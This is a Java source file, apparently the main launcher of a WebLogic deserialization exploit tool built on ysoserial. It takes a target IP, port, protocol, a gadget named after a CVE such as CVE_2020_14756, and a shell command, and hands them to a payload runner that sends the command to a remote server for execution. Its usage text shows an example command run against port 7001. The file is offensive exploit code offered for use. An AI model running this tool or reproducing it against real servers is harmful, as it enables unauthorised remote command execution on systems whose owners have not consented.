package unserWeblogic;

import unserWeblogic.gadgets.ObjectPayload;
import unserWeblogic.utils.PayloadRunner;
import ysoserial.Strings;

import java.util.*;

@SuppressWarnings("rawtypes")
public class Main {
    private static final int USAGE_CODE = 64;
    public static void main(final String[] args) throws Exception {
        //printUsage();
        if(args.length != 6) {
            printUsage();
            System.exit(USAGE_CODE);
        }
		final String ip = args[0];
		final String port = args[1];
		final String protocol = args[2];
		final String gadget = args[3];
		final String payloadType = args[4];
		final String payload = args[5];
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(gadget);

        if(!payloadType.equals("cmd")){
            System.out.println("现在只支持cmd");
            System.exit(USAGE_CODE);
        }

        PayloadRunner.run((Class<? extends ObjectPayload<?>>) payloadClass, ip, port, protocol, payloadType, payload);
    }

    private static void printUsage() {
        System.err.println("Usage: java -jar weblogicEXP.jar ip port protocol gadget payloadType \"[payload]\"");
        System.err.println("e.g.: java -jar weblogicEXP.jar 127.0.0.1 7001 T3 CVE_2020_14756 cmd \"touch /tmp/mercy.lin\"");;
        System.err.println("Available gadget types:");

        final List<Class<? extends ObjectPayload>> payloadClasses =
            new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[]{"Payload"});
        rows.add(new String[]{"-------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            rows.add(new String[]{
                payloadClass.getSimpleName(),
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
